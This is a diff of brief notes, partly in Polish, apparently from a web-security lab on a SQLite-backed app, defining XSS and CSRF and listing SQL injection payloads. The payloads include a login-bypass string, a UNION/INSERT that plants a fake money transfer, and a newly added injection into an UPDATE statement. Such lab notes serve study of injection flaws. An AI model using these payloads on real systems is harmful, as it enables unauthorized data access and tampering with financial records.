@@ -3,9 +3,12 @@ Cross-site scripting (or XSS) allows an attacker to execute arbitrary JavaScript
 
 Cross-site request forgery (or CSRF) allows an attacker to induce a victim user to perform actions that they do not intend to.
 
-SQL:
+SQL SELECT:
 wyświetl dane bez dostępu: agnes" OR "1"="1" --
 dodaje (powinno): agnes" union INSERT INTO accounts_transfer VALUES(1001, 'hacker', 8888888888888888, 'hacking mocny', 87676, 2021-01-16, 1000) --
+
+SQL SET:
+xxx', receiver_name = (SELECT sqlite_version()) WHERE id = 1; --
 
 niestety SQLlite nie pozwala na wiele zapytań podczas jednej realizacji .raw().
 
